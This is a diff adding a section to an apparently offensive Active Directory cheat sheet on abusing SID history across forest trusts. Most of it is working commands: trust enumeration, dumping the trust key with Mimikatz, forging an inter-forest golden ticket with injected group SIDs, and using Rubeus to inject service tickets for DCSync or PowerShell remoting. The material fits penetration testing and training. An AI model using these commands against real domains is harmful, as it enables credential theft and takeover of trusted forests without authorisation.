+- If a external trust has SID history enabled. It is possible to inject a SIDHistory for RID => 1000 (higher then 1000) to access resources accessible to that identity or group in the target trusting forest. Needs to be user created!
+- This means, if we have an external trust (or a forest trust with SID history enabled /enablesidhistory:yes), we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest. 
+
+#### Enumerate if SIDFilteringForestAware is enabled
+- Run on the DC.
+```
+Get-ADTrust -Filter *
+```
+
+#### Enumerate groups of the target forest with SID higher then 1000
+```
+Get-ADGroup -Filter 'SID -ge "<TARGET FOREST SID>-1000"' -Server <TARGET FOREST>
+```
+ 
+#### Get trust key
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+```
+ 
+#### Get domain SID
+```
+Get-DomainSID
+```
+ 
+#### Create a intern-forest TGT
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
+```
+
+#### Create and inject TGS
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+```
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
+```
+
+#### Use the TGS and execute DCsync or psremoting etc!
 
 ## Foreign Security Principals
 - A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).
